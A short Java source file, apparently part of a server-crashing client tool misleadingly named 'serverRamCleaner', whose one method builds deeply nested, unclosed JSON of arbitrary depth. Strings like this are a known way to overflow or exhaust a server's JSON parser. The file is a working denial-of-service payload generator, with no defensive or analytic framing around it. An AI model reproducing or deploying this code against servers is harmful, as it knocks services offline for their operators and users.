package aspw.serverramcleaner.serverRamCleaner.client;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class JsonGenerator {

    public static String generateJsonObject(int levels) {
        String inValue = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());

        return "{a:" + inValue + "}";
    }
}